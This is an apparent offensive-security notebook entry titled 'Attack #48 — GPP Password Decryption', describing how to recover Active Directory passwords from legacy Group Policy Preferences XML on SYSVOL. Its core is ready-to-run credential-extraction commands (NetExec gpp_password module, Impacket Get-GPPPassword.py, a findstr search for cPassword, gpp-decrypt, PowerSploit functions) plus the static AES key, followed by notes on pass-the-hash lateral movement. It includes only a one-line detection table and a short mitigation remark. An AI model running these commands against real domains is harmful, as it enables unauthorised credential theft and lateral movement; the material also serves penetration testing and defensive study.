---
title: "Attack #48 — GPP Password Decryption"
description: "Group Policy Preferences (GPP) allowed admins to set local admin passwords, create scheduled tasks, and configure services via Group Policy — with the…"
category: active-directory
subcategory: "Privilege & Group Abuse"
tags: ["active-directory"]
tools: ["NetExec", "Impacket", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Six/🟣 Attack #48 — GPP Password Decryption.md"
---
# 🟣 Attack #48 — GPP Password Decryption

***

## 📖 How It Works

Group Policy Preferences (GPP) allowed admins to set local admin passwords, create scheduled tasks, and configure services via Group Policy — with the password stored in `cPassword` in XML files on SYSVOL. Microsoft encrypted these passwords with a **publicly-known static AES key** (published in MSDN documentation), making any GPP password trivially decryptable by any domain user who can read SYSVOL.

Microsoft patched this in **MS14-025** (May 2014), but old GPP XML files may still exist on SYSVOL.

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Any domain user** | SYSVOL is readable by all authenticated users |
| **Legacy GPP files still present** | Created before MS14-025 |

***

## 💻 Full Commands

```bash
# ── NetExec — automated GPP password extraction ──────────────────────────────
nxc smb DC01.corp.local -u low_user -p 'Password1' -M gpp_password

# ── Impacket — Get-GPPPassword ────────────────────────────────────────────────
Get-GPPPassword.py corp.local/low_user:'Password1'@DC01.corp.local

# ── Manual — search SYSVOL for cPassword ──────────────────────────────────────
findstr /S /I cPassword \\corp.local\SYSVOL\corp.local\Policies\*.xml

# ── Decrypt the cPassword value ───────────────────────────────────────────────
gpp-decrypt <cPassword_value>
# The AES key is: 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b
```

```powershell
# ── PowerSploit ───────────────────────────────────────────────────────────────
Import-Module .\PowerSploit.ps1
Get-CachedGPPPassword
Get-GPPPassword
```

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **5145** | Security Log (DC) | Access to SYSVOL — reading Policy XML files |

***

## 🔗 Attack Chain Context

```
[GPP Passwords] ──→ Decrypt legacy local admin passwords from SYSVOL
         │
         ├──→ 🔑 Extracted passwords often = local admin on many machines
         ├──→ 🔗 PtH (#4) with discovered credentials → lateral movement
         └──→ 💀 Defeated by: delete old GPP XML files, use LAPS instead
```

***

> ✅ **Attack #48 — GPP Password Decryption complete.**
